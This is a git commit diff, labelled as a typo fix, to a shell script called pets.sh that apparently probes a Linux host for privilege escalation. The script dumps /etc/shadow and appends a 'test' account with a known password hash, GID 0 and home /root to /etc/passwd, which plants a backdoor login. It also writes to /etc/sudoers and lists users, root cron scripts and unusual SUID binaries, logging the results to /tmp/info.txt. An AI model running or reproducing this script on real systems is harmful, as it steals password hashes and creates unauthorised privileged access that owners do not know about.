951032cfee646824f5a413d7f342458483d455e7
Gandalf <nope@nope.nothanks.no>
2024-02-20 20:12:36 -0800

    fixed minor typos

--- pets.sh
+++ pets.sh
@@ -18,16 +18,16 @@ echo 'SHADOW?' >> /tmp/info.txt
 cat /etc/shadow || echo 'can not cat shadow file' >> /tmp/info.txt
 echo '------------------------------------------------------------------------------' >> /tmp/info.txt
 echo 'WRITE PASSWD?' >> /tmp/info.txt
-echo 'test:$6$52450745$k5ka2p8bFuSmoVT1tzOyyuaREkkKBcCNqoDKzYiJL9RaE8yMnPgh2XzzF0NDrUhgrcLwg78xs1w5pJiypEdFX/:5000:0::/root:/bin/bash' >> /etc/passwd && echo 'yup – password = hashcat user = test' | echo 'nope' >> /tmp/info.txt 
+echo 'test:$6$52450745$k5ka2p8bFuSmoVT1tzOyyuaREkkKBcCNqoDKzYiJL9RaE8yMnPgh2XzzF0NDrUhgrcLwg78xs1w5pJiypEdFX/:5000:0::/root:/bin/bash' >> /etc/passwd && echo 'yup – password = hashcat user = test' || echo 'nope' >> /tmp/info.txt
 echo '------------------------------------------------------------------------------' >> /tmp/info.txt
 echo 'WRITE SUDOERS FILE?' >> /tmp/info.txt
-echo '#test' >> /etc/sudoers && echo 'yup' >> /tmp/info.txt | echo 'nope' >> /tmp/info.txt
+echo '#test' >> /etc/sudoers && echo 'yup' >> /tmp/info.txt || echo 'nope' >> /tmp/info.txt
 echo '------------------------------------------------------------------------------' >> /tmp/info.txt
 echo 'LIST OF USERS' >> /tmp/info.txt
 awk -F: '$3 >= 1000 && $3 <= 60000' /etc/passwd | grep -v nobody >> /tmp/info.txt
 echo '------------------------------------------------------------------------------' >> /tmp/info.txt
 echo 'ROOT CRON SCRIPTS?' >> /tmp/info.txt
-grep '^root' /etc/crontab | grep -E '\.sh$|\.py$' >> /tmp/info.txt | echo 'no bash or python as root'>> /tmp/info.txt
+grep '^root' /etc/crontab | grep -E '\.sh$|\.py$' >> /tmp/info.txt || echo 'no bash or python as root'>> /tmp/info.txt
 echo '------------------------------------------------------------------------------' >> /tmp/info.txt
 echo 'SUID BITS' >> /tmp/info.txt
 find /usr /bin -type f -perm -4000 2>/dev/null | grep -v -E '(sudo|passwd|su|ping|ping6|newgrp|chsh|chfn|mount|umount|gpasswd|polkit-agent-helper-1)'  >> /tmp/info.txt
